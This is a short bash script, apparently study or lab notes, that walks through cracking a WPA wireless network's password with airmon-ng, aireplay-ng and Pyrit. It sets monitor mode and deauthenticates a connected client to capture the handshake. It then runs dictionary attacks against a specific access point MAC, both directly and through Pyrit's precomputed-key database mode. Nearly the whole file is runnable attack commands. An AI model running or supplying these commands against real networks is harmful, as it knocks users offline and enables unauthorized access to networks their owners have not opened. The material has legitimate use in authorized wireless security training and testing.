#!/bin/bash

# Set wireless card in monitor mode
airmon-ng start wlan0 6

# Capture the 4-way-handshake with Pyrit
# pyrit -r <interface> -o <capture> stripLive
pyrit -r mon0 -o pyrit-cap stripLive

# Deauthenticate a client to capture the handshake
aireplay-ng -0 1 -a 1C:7E:E5:32:C7:DE -c 8C:85:90:56:BA:6A mon0

# Not necessary:
# Analyze the capture
pyrit -r pyrit-cap analyze
# Modify the capture to import it to airodump
pyrit -r pyrit-cap -o pyrit-cap-airodump strip

# Pyrit dictionary attack
# pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
pyrit -r pyrit-cap -i /usr/share/wordlists/password.lst -b 1C:7E:E5:32:C7:DE attack_passthrough

# Pyrit Database mode
# View database status
pyrit eval

# Import wordlist to the database
# pyrit -i <wordlist> import_passwords
pyrit -i /usr/share/wordlists/password.lst import_passwords

# Import an ESSID to the database
# pyrit -e <ESSID> create_essid
pyrit -e WIFU create_essid

# Compute the pairwise master keys
pyrit batch

# Launch Pyrit attack in database mode
# pyrit -r <capture>-b <AP MAC> attack_db
pyrit -r pyrit-cap -b 1C:7E:E5:32:C7:DE attack_db
